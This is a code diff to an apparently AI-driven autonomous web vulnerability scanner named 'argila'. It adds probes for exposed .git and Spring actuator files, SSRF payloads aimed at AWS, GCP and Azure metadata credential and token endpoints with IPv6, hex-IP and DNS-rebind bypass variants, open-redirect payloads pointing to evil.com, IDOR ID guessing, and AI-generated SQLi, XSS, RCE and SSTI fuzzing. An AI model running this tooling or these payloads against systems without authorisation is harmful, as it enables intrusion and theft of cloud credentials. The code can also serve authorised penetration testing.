+            if (sfUrl.includes('.git/') && res.status === 200 && bodyStr.includes('[core]')) {
+              this.log(jobId, 'vuln', `CONFIRMED Git Repository Exposure: ${sfUrl}`);
+              MemoryManager.addFinding(jobId, hostname, { type: 'Git Exposure', endpoint: sfUrl, gap: 'Git repository accessible — source code leak', chain_potential: 'Extract credentials, API keys, and source code' });
+              sensitiveFileCount++;
+              continue;
+            }
+
+            // Actuator endpoints — verify without AI
+            if (sfUrl.includes('actuator') && res.status === 200) {
+              this.log(jobId, 'vuln', `CONFIRMED Spring Actuator Exposure: ${sfUrl}`, { preview: bodyStr.substring(0, 300) });
+              MemoryManager.addFinding(jobId, hostname, { type: 'Actuator Exposure', endpoint: sfUrl, gap: 'Spring Boot Actuator endpoint exposed', chain_potential: 'Environment variables, beans, and health data leaked' });
+              sensitiveFileCount++;
+              continue;
+            }
+
+            // Swagger/OpenAPI — verify without AI
+            if ((sfUrl.includes('swagger') || sfUrl.includes('api-docs') || sfUrl.includes('openapi')) && res.status === 200 && (bodyStr.includes('swagger') || bodyStr.includes('openapi'))) {
+              this.log(jobId, 'vuln', `API Documentation Exposed: ${sfUrl}`, { preview: bodyStr.substring(0, 300) });
+              MemoryManager.addFinding(jobId, hostname, { type: 'API Docs Exposure', endpoint: sfUrl, gap: 'Swagger/OpenAPI docs publicly accessible', chain_potential: 'Map all API endpoints for targeted exploitation' });
+              sensitiveFileCount++;
+              continue;
+            }
 
             if (res.status === 200 && hasSensitiveContent && ai) {
               const analysisPrompt = `As an autonomous security agent (argila), verify if this is a SENSITIVE FILE DISCLOSURE.
-              URL: ${sf.url}
+              URL: ${sfUrl}
               Status: ${res.status}
+              Matched sensitive markers: ${matchedMarkers.join(', ')}
               Body Snippet: ${bodyStr.substring(0, 3000)}
               
-              Determine if this file contains REAL sensitive information (credentials, internal paths, system config) or if it's a false positive (e.g., a generic landing page or a public documentation page).
-              
+              Determine if this file contains REAL sensitive information (credentials, internal paths, system config) or if it's a false positive.
+              Classify severity: CRITICAL (credentials, keys), HIGH (internal config, debug), MEDIUM (info leak), LOW (minor disclosure).
               Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
 
-              const analysisText = await ai.generate(analysisPrompt, true);
-
-              if (analysisText) {
-                const analysis = JSON.parse(analysisText);
-                if (analysis.isVulnerable && analysis.confidence > 0.8) {
-                  this.log(jobId, 'vuln', `CONFIRMED Sensitive File Disclosure: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
-                  MemoryManager.addFinding(jobId, hostname, { type: 'Sensitive File Disclosure', endpoint: sf.url, gap: analysis.gap_identified, chain_potential: analysis.chain_potential });
-                }
+              const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
+              if (analysis.isVulnerable && analysis.confidence > 0.7) {
+                this.log(jobId, 'vuln', `CONFIRMED Sensitive File Disclosure: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential, url: sfUrl });
+                MemoryManager.addFinding(jobId, hostname, { type: 'Sensitive File Disclosure', endpoint: sfUrl, gap: analysis.gap_identified, chain_potential: analysis.chain_potential });
+                sensitiveFileCount++;
               }
             }
-          } catch (e) {}
+          } catch {}
         }
+        this.log(jobId, 'info', `Phase 4b complete: ${sensitiveFileCount} sensitive file(s) confirmed across ${probeUrls.size} probes`);
 
-        // 3. SSRF to Cloud Metadata Auditor (AWS/GCP/Azure)
-        const ssrfEndpoints = endpoints.filter(e => e.url.includes('=http') || e.url.includes('url=') || e.url.includes('dest=') || e.url.includes('redirect='));
-        for (const se of ssrfEndpoints) {
-          const cloudPayloads = [
-            'http://169.254.169.254/latest/meta-data/', // AWS
-            'http://metadata.google.internal/computeMetadata/v1/', // GCP
-            'http://169.254.169.254/metadata/instance?api-version=2021-02-01' // Azure
-          ];
+        // --- 4c: SSRF & Open Redirect Auditor ---
+        this.log(jobId, 'info', 'Phase 4c: SSRF & Open Redirect Audit');
 
+        // Expanded SSRF endpoint detection — GET and POST parameters
+        const ssrfParamPatterns = ['url', 'dest', 'redirect', 'uri', 'path', 'next', 'target', 'rurl', 'return', 'returnTo', 'callback', 'go', 'link', 'src', 'source', 'file', 'document', 'fetch', 'proxy', 'host', 'domain', 'site', 'page', 'feed', 'img', 'image'];
+        const ssrfEndpoints = endpoints.filter(e => {
+          const lower = e.url.toLowerCase();
+          return ssrfParamPatterns.some(p => lower.includes(`${p}=`) || lower.includes(`${p}%3d`));
+        });
+
+        // Cloud metadata payloads — expanded with bypass variants
+        const cloudPayloads = [
+          // AWS
+          { url: 'http://169.254.169.254/latest/meta-data/', name: 'AWS IMDSv1', markers: ['ami-id', 'instance-id', 'iam', 'security-credentials'] },
+          { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', name: 'AWS IAM Creds', markers: ['AccessKeyId', 'SecretAccessKey', 'Token'] },
+          { url: 'http://169.254.169.254/latest/user-data', name: 'AWS User Data', markers: ['#!/', 'cloud-init', 'user-data'] },
+          // AWS bypass variants
+          { url: 'http://[::ffff:169.254.169.254]/latest/meta-data/', name: 'AWS IPv6 Bypass', markers: ['ami-id', 'instance-id'] },
+          { url: 'http://169.254.169.254.nip.io/latest/meta-data/', name: 'AWS DNS Rebind', markers: ['ami-id', 'instance-id'] },
+          { url: 'http://0xA9FEA9FE/latest/meta-data/', name: 'AWS Hex IP', markers: ['ami-id', 'instance-id'] },
+          // GCP
+          { url: 'http://metadata.google.internal/computeMetadata/v1/', name: 'GCP Metadata', markers: ['computeMetadata', 'project-id'] },
+          { url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', name: 'GCP Token', markers: ['access_token'] },
+          // Azure
+          { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', name: 'Azure Metadata', markers: ['compute', 'vmId'] },
+          { url: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', name: 'Azure Token', markers: ['access_token'] },
+          // DigitalOcean
+          { url: 'http://169.254.169.254/metadata/v1/', name: 'DO Metadata', markers: ['droplet_id', 'hostname'] },
+          // Internal services
+          { url: 'http://127.0.0.1:6379/', name: 'Redis', markers: ['REDIS', 'redis_version'] },
+          { url: 'http://127.0.0.1:9200/', name: 'Elasticsearch', markers: ['cluster_name', 'version'] },
+          { url: 'http://127.0.0.1:8500/v1/agent/self', name: 'Consul', markers: ['Config', 'Member'] },
+        ];
+
+        let ssrfCount = 0;
+        for (const se of ssrfEndpoints.slice(0, 30)) {
+          if (ssrfCount >= 5) break; // Cap confirmed SSRFs
           for (const cp of cloudPayloads) {
             try {
-              const testUrl = se.url.replace(/(url|dest|redirect|uri|path)=([^&]+)/, `$1=${encodeURIComponent(cp)}`);
-              const res = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true, headers: { 'Metadata-Flavor': 'Google' } });
+              // Try replacing each matching parameter
+              const paramRegex = new RegExp(`(${ssrfParamPatterns.join('|')})=([^&]+)`, 'i');
+              const testUrl = se.url.replace(paramRegex, `$1=${encodeURIComponent(cp.url)}`);
+              if (testUrl === se.url) continue; // No param was replaced
+              
+              const headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0' };
+              if (cp.name.includes('GCP')) headers['Metadata-Flavor'] = 'Google';
+              if (cp.name.includes('Azure')) headers['Metadata'] = 'true';
+              
+              const res = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true, headers, maxRedirects: 0 });
               const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
 
-              if (res.status === 200 && (bodyStr.includes('ami-id') || bodyStr.includes('instance-id') || bodyStr.includes('computeMetadata'))) {
-                this.log(jobId, 'vuln', `CONFIRMED SSRF to Cloud Metadata: ${se.url}`, { payload: cp });
-                MemoryManager.addFinding(jobId, hostname, { type: 'SSRF', endpoint: se.url, gap: 'Cloud Metadata Leak', chain_potential: 'Full AWS/GCP takeover via metadata tokens' });
+              if (res.status === 200 && cp.markers.some(m => bodyStr.includes(m))) {
+                this.log(jobId, 'vuln', `CONFIRMED SSRF → ${cp.name}: ${se.url}`, { payload: cp.url, evidence: bodyStr.substring(0, 500) });
+                MemoryManager.addFinding(jobId, hostname, { type: 'SSRF', endpoint: se.url, gap: `SSRF to ${cp.name}`, chain_potential: `Full ${cp.name.split(' ')[0]} takeover via metadata tokens` });
+                ssrfCount++;
+                break; // Move to next endpoint once one payload hits
               }
-            } catch (e) {}
+            } catch {}
           }
         }
+
+        // Open Redirect detection via parameter manipulation
+        const redirectEndpoints = endpoints.filter(e => {
+          const lower = e.url.toLowerCase();
+          return ['redirect', 'next', 'return', 'returnto', 'callback', 'go', 'url', 'rurl', 'dest'].some(p => lower.includes(`${p}=`));
+        });
+
+        for (const re of redirectEndpoints.slice(0, 20)) {
+          try {
+            const redirectPayloads = [
+              'https://evil.com',
+              '//evil.com',
+              '/\\evil.com',
+              'https:evil.com',
+              '////evil.com',
+            ];
+            for (const payload of redirectPayloads) {
+              const paramRegex = new RegExp(`(redirect|next|return|returnto|callback|go|url|rurl|dest)=([^&]+)`, 'i');
+              const testUrl = re.url.replace(paramRegex, `$1=${encodeURIComponent(payload)}`);
+              if (testUrl === re.url) continue;
+              
+              const res = await axios.get(testUrl, { timeout: 5000, maxRedirects: 0, validateStatus: () => true });
+              const location = (res.headers['location'] || '').toLowerCase();
+              if ((res.status === 301 || res.status === 302 || res.status === 303 || res.status === 307 || res.status === 308) && location.includes('evil.com')) {
+                this.log(jobId, 'vuln', `CONFIRMED OPEN REDIRECT: ${re.url}`, { payload, location: res.headers['location'] });
+                MemoryManager.addFinding(jobId, hostname, { type: 'Open Redirect', endpoint: re.url, gap: 'Unvalidated redirect allows arbitrary domain', chain_potential: 'Phishing, OAuth token theft via redirect' });
+                break;
+              }
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4c complete: ${ssrfCount} SSRF(s) confirmed across ${ssrfEndpoints.length} candidate endpoints`);
 
         // 4. Generic Vulnerability Fuzzing (SQLi, XSS, etc.)
         const vulnerabilities: any[] = [];
         
         // --- STACK GAP ANALYSIS (Adversary Simulation) ---
-        this.log(jobId, 'info', 'Strategy 3: Stack Gap Analysis (WAF/Proxy Smuggling)');
-        for (const asset of discoveredAssets.slice(0, 3)) {
+        this.log(jobId, 'info', 'Phase 4: Stack Gap Analysis (WAF/Proxy Smuggling)');
+        for (const asset of discoveredAssets.slice(0, 5)) {
           try {
             const gaps = await StackGapAnalyzer.analyze(asset);
             if (gaps.length > 0) {
               this.log(jobId, 'vuln', `STACK GAP IDENTIFIED on ${asset}`, { gaps });
               allFindings.push({ phase: 'Phase 4', type: 'Stack Gap Findings', asset, data: gaps });
             }
-          } catch (e) {}
+          } catch (e) {
+            this.log(jobId, 'warn', `Stack gap analysis failed for ${asset}: ${(e as Error).message}`);
+          }
         }
 
         // Priority-based testing: combine AI-ranked with keyword-based high-value endpoints
-        const keywordEndpoints = endpoints.filter(e =>
-          e.url.includes('api') || e.url.includes('admin') || e.url.includes('auth') || e.url.includes('?') || e.url.includes('login')
-        );
+        const keywordEndpoints = endpoints.filter(e => {
+          const lower = e.url.toLowerCase();
+          return lower.includes('api') || lower.includes('admin') || lower.includes('auth') || lower.includes('?') || lower.includes('login') || lower.includes('user') || lower.includes('account') || lower.includes('profile');
+        });
 
-        const combinedEndpoints = [
-          ...rankedEndpoints.map(re => ({ url: re.url, method: re.method || 'GET', priority: re.priority || 1 })),
-          ...keywordEndpoints.map(ke => ({ ...ke, priority: 2 }))
-        ];
+        // Build priority map to preserve highest priority per URL
+        const priorityMap = new Map<string, { url: string; method: string; priority: number }>();
+        for (const re of rankedEndpoints) {
+          const entry = { url: re.url, method: re.method || 'GET', priority: re.priority || 1 };
+          const existing = priorityMap.get(re.url);
+          if (!existing || entry.priority < existing.priority) priorityMap.set(re.url, entry);
+        }
+        for (const ke of keywordEndpoints) {
+          if (!priorityMap.has(ke.url)) priorityMap.set(ke.url, { ...ke, priority: 2 });
+        }
 
-        // Deduplicate and sort by priority
-        const prioritizedEndpoints = Array.from(new Set(combinedEndpoints.map(e => e.url)))
-          .map(url => combinedEndpoints.find(e => e.url === url))
-          .sort((a, b) => (a?.priority || 10) - (b?.priority || 10))
-          .slice(0, 75); // Increased depth for comprehensive autonomous hunt
+        const prioritizedEndpoints = Array.from(priorityMap.values())
+          .sort((a, b) => a.priority - b.priority)
+          .slice(0, 100);
 
-        this.log(jobId, 'info', `Executing autonomous exploit chain on ${prioritizedEndpoints.length} prioritized endpoints.`, {
+        this.log(jobId, 'info', `Executing autonomous exploit chain on ${prioritizedEndpoints.length} prioritized endpoints`, {
           active_intelligence: {
             users: discoveredInfo.users.length,
             identifiers: Object.keys(discoveredInfo.identifiers).length,
@@ -681,132 +1025,159 @@ export class AutomationEngine {
           }
         });
 
+        // --- IDOR Detection (enhanced with UUID and string ID patterns) ---
         for (const ep of prioritizedEndpoints) {
-          if (!ep) continue;
-          // IDOR Detection Logic
-          const idMatch = ep.url.match(/\/(\d+)(?:\/|$|\?)/);
-          if (idMatch) {
-            const originalId = idMatch[1];
-            const testIds = [parseInt(originalId) + 1, parseInt(originalId) - 1, 1, 123456];
+          // Numeric ID pattern
+          const numIdMatch = ep.url.match(/\/(\d+)(?:\/|$|\?)/);
+          // UUID pattern
+          const uuidMatch = ep.url.match(/\/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:\/|$|\?)/i);
+
+          if (numIdMatch || uuidMatch) {
+            const originalId = numIdMatch ? numIdMatch[1] : uuidMatch![1];
+            const testIds = numIdMatch
+              ? [String(parseInt(originalId) + 1), String(parseInt(originalId) - 1), '1', '0', '999999']
+              : ['00000000-0000-0000-0000-000000000000', '11111111-1111-1111-1111-111111111111'];
+
+            // Fetch baseline once
+            const baselineRes = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true }).catch(() => null);
+            if (!baselineRes || baselineRes.status === 404) continue;
+
             for (const testId of testIds) {
               try {
-                const testUrl = ep.url.replace(`/${originalId}`, `/${testId}`);
+                const testUrl = ep.url.replace(originalId, testId);
                 const res = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true });
-                const baselineRes = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true }).catch(() => null);
                 
-                if (res.status === 200 && baselineRes && res.status === baselineRes.status && JSON.stringify(res.data) !== JSON.stringify(baselineRes.data)) {
+                const baseBody = typeof baselineRes.data === 'string' ? baselineRes.data : JSON.stringify(baselineRes.data);
+                const testBody = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
+
+                if (res.status === 200 && res.status === baselineRes.status && testBody !== baseBody && testBody.length > 50) {
                   if (ai) {
                     const analysisPrompt = `Analyze these two responses for IDOR (Insecure Direct Object Reference).
-                    Original URL: ${ep.url}
-                    Test URL: ${testUrl}
-                    Response 1 Body: ${JSON.stringify(baselineRes.data).substring(0, 1000)}
-                    Response 2 Body: ${JSON.stringify(res.data).substring(0, 1000)}
+                    Original URL: ${ep.url} | Test URL: ${testUrl}
+                    Response 1 Body: ${baseBody.substring(0, 1000)}
+                    Response 2 Body: ${testBody.substring(0, 1000)}
                     
-                    Determine if changing the ID in the URL allowed access to another user's or object's data.
+                    Determine if changing the ID allowed access to another user's/object's data. Check for PII, different user context, or unauthorized data access.
                     Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
 
-                    const analysisText = await ai.generate(analysisPrompt, true);
-
-                    if (analysisText) {
-                      const analysis = JSON.parse(analysisText);
-                      if (analysis.isVulnerable && analysis.confidence > 0.8) {
-                        this.log(jobId, 'vuln', `CONFIRMED IDOR: ${analysis.gap_identified}`, { explanation: analysis.explanation });
-                        vulnerabilities.push({ endpoint: ep.url, type: 'IDOR', gap: analysis.gap_identified, evidence: analysis.explanation });
-                      }
+                    const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
+                    if (analysis.isVulnerable && analysis.confidence > 0.8) {
+                      this.log(jobId, 'vuln', `CONFIRMED IDOR: ${analysis.gap_identified}`, { explanation: analysis.explanation, originalUrl: ep.url, testUrl });
+                      vulnerabilities.push({ endpoint: ep.url, type: 'IDOR', gap: analysis.gap_identified, evidence: analysis.explanation });
+                      MemoryManager.addFinding(jobId, hostname, { type: 'IDOR', endpoint: ep.url, gap: analysis.gap_identified, chain_potential: analysis.chain_potential });
+                      break; // One confirmed IDOR per endpoint is enough
                     }
                   }
                 }
-              } catch (e) {}
+              } catch {}
             }
           }
+        }
 
-          const vulnTypes = ['SQLi', 'XSS', 'Path Traversal', 'SSRF', 'RCE', 'SSTI', 'NoSQLi'];
+        // --- Payload Fuzzing (SQLi, XSS, Path Traversal, SSRF, RCE, SSTI, NoSQLi) ---
+        const vulnTypes = ['SQLi', 'XSS', 'Path Traversal', 'SSRF', 'RCE', 'SSTI', 'NoSQLi'];
+
+        // Cache baselines per URL to avoid redundant requests
+        const baselineCache = new Map<string, { status: number; body: string } | null>();
+        async function getBaseline(url: string) {
+          if (baselineCache.has(url)) return baselineCache.get(url)!;
+          try {
+            const res = await axios.get(url, { timeout: 5000, validateStatus: () => true });
+            const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
+            const entry = { status: res.status, body };
+            baselineCache.set(url, entry);
+            return entry;
+          } catch {
+            baselineCache.set(url, null);
+            return null;
+          }
+        }
+
+        for (const ep of prioritizedEndpoints) {
+          const baseline = await getBaseline(ep.url);
           
           for (const type of vulnTypes) {
             try {
-              // Enhanced context for AI-driven payload generation (Chaining discovered intel)
               const aiContext = `Endpoint: ${ep.url}, Method: ${ep.method}, Tech: ${memory.tech.join(', ')}, Discovered Intel: ${JSON.stringify(discoveredInfo)}`;
               const customPayload = await PayloadOven.generateCustomPayload(ai, type, aiContext);
               
-              // Smart parameter replacement
+              // Smart parameter replacement — replace each param value individually
               let testUrl = ep.url;
               if (ep.url.includes('=')) {
-                // Replace values of existing parameters
                 testUrl = ep.url.replace(/=([^&]+)/g, `=${encodeURIComponent(customPayload)}`);
               } else {
-                // Append new parameter
                 testUrl = ep.url.includes('?') ? `${ep.url}&test=${encodeURIComponent(customPayload)}` : `${ep.url}?test=${encodeURIComponent(customPayload)}`;
               }
               
               const startTime = Date.now();
-              const res = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true });
+              const res = await axios.get(testUrl, { timeout: 8000, validateStatus: () => true });
               const latency = Date.now() - startTime;
               
-              // 1. Initial Baseline Comparison (Heuristic Trigger)
-              const baselineRes = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true }).catch(() => null);
-              const isStatusDiff = baselineRes && res.status !== baselineRes.status;
-              const isLatencySpike = type === 'SQLi' && latency > 3000; // Time-based SQLi trigger
               const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
-              const hasErrorMarkers = bodyStr.includes('error') || bodyStr.includes('exception') || bodyStr.includes('syntax');
+              const isStatusDiff = baseline && res.status !== baseline.status;
+              const isLatencySpike = type === 'SQLi' && latency > 3000;
+              
+              // Enhanced error markers per vuln type
+              const errorMarkers: Record<string, string[]> = {
+                'SQLi': ['sql syntax', 'mysql', 'postgresql', 'sqlite', 'ora-', 'mssql', 'unclosed quotation', 'quoted string', 'syntax error at'],
+                'XSS': [customPayload, '<script>', 'onerror=', 'onload='],
+                'Path Traversal': ['root:', '/bin/', 'win.ini', '[extensions]', 'etc/passwd'],
+                'RCE': ['uid=', 'gid=', 'root:', 'www-data'],
+                'SSTI': ['49', '7777777', '__class__', 'config'],
+                'SSRF': ['ami-id', 'instance-id', 'computeMetadata'],
+                'NoSQLi': ['$gt', '$ne', 'CastError', 'ObjectId'],
+              };
+              
+              const typeMarkers = errorMarkers[type] || [];
+              const bodyLower = bodyStr.toLowerCase();
+              const hasTypeMarkers = typeMarkers.some(m => bodyLower.includes(m.toLowerCase()));
+              const hasGenericError = bodyLower.includes('error') || bodyLower.includes('exception') || bodyLower.includes('stack trace');
 
-              // Agentic AI Verification (Only if there's a trigger)
-              if (ai && (isStatusDiff || isLatencySpike || hasErrorMarkers)) {
+              // Verification trigger: need at least one indicator
+              if (ai && (isStatusDiff || isLatencySpike || hasTypeMarkers || (hasGenericError && isStatusDiff))) {
                 const analysisPrompt = `As an autonomous security agent (argila), analyze this HTTP interaction on ${hostname} to find the exact security gap.
                 Target URL: ${testUrl}
                 Payload: ${customPayload}
                 Vulnerability Type: ${type}
-                Response Status: ${res.status}
+                Response Status: ${res.status} (baseline: ${baseline?.status || 'unknown'})
                 Response Latency: ${latency}ms
-                Response Body (truncated): ${typeof res.data === 'string' ? res.data.substring(0, 2000) : JSON.stringify(res.data).substring(0, 2000)}
+                Response Body (truncated): ${bodyStr.substring(0, 2000)}
+                Matched Indicators: ${hasTypeMarkers ? 'type-specific markers found' : ''} ${isLatencySpike ? 'timing anomaly' : ''} ${isStatusDiff ? 'status code change' : ''}
                 
-                [CRITICAL CONTEXT - TECH STACK]: ${memory.tech.join(', ')}
-                [CRITICAL CONTEXT - IDENTIFIERS]: ${JSON.stringify(memory.identifiers)}
-
-                Memory of Target Behavior:
-                - Discovered Users: ${memory.discoveredUsers.join(', ')}
-                - Previous Findings: ${JSON.stringify(memory.findings)}
+                [CONTEXT]: Tech: ${memory.tech.join(', ')} | Users: ${memory.discoveredUsers.join(', ')} | Findings: ${JSON.stringify(memory.findings)}
                 
-                Determine if this is a REAL security vulnerability or just noise/false positive.
-                Chaining Logic: Can this finding be combined with previous identifiers or users to escalate impact?
-                
+                Determine if this is a REAL ${type} vulnerability. Reject false positives (generic error pages, WAF blocks, rate limits).
+                Can this be chained with previous findings for escalation?
                 Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
 
-                const analysisText = await ai.generate(analysisPrompt, true);
-                
-                if (analysisText) {
-                  const analysis = JSON.parse(analysisText);
-                  if (analysis.isVulnerable && analysis.confidence > 0.8) {
-                    this.log(jobId, 'vuln', `CONFIRMED ${type}: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
-                    const finding = { 
-                      endpoint: ep.url, 
-                      type: type, 
-                      payload: customPayload, 
-                      gap: analysis.gap_identified,
-                      evidence: analysis.explanation,
-                      chain: analysis.chain_potential
-                    };
-                    vulnerabilities.push(finding);
-                    MemoryManager.addFinding(jobId, hostname, finding);
-                  }
+                const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
+                if (analysis.isVulnerable && analysis.confidence > 0.8) {
+                  this.log(jobId, 'vuln', `CONFIRMED ${type}: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential, payload: customPayload });
+                  const finding = { 
+                    endpoint: ep.url, type, payload: customPayload, 
+                    gap: analysis.gap_identified, evidence: analysis.explanation, chain: analysis.chain_potential
+                  };
+                  vulnerabilities.push(finding);
+                  MemoryManager.addFinding(jobId, hostname, finding);
                 }
               }
-            } catch (e) {}
+            } catch {}
           }
         }
 
+        this.log(jobId, 'info', `Phase 4 fuzzing complete: ${vulnerabilities.length} vulnerability(ies) confirmed across ${prioritizedEndpoints.length} endpoints`);
+
+        // --- PoC Generation (hardened with safe JSON parse) ---
         if (ai && vulnerabilities.length > 0) {
-          const pocPrompt = `Generate a detailed Proof of Concept (PoC) for these confirmed vulnerabilities: ${JSON.stringify(vulnerabilities)}. 
+          const pocPrompt = `Generate a detailed Proof of Concept (PoC) for these confirmed vulnerabilities: ${JSON.stringify(vulnerabilities.slice(0, 10))}. 
           Target: ${targetUrl}. 
-          Include: 1. Description, 2. Steps to Reproduce, 3. Impact, 4. Remediation.
+          Include: 1. Description, 2. Steps to Reproduce (curl/browser), 3. Impact (CIA triad), 4. Remediation.
           Format: JSON { "pocs": [ { "title": string, "steps": string[], "impact": string, "remediation": string, "severity": string } ] }`;
           
-          try {
-            const pocText = await ai.generate(pocPrompt, true);
-            if (pocText) {
-              const pocData = JSON.parse(pocText);
-              allFindings.push({ phase: 'Phase 4', type: 'AI PoC Reports', data: pocData.pocs });
-            }
-          } catch (e) {}
+          const pocData = safeJsonParse<{ pocs: any[] }>(await ai.generate(pocPrompt, true), { pocs: [] });
+          if (pocData.pocs.length > 0) {
+            allFindings.push({ phase: 'Phase 4', type: 'AI PoC Reports', data: pocData.pocs });
+          }
         }
 
         // --- PHASE 5: REPORTING (FINAL SYNTHESIS) ---
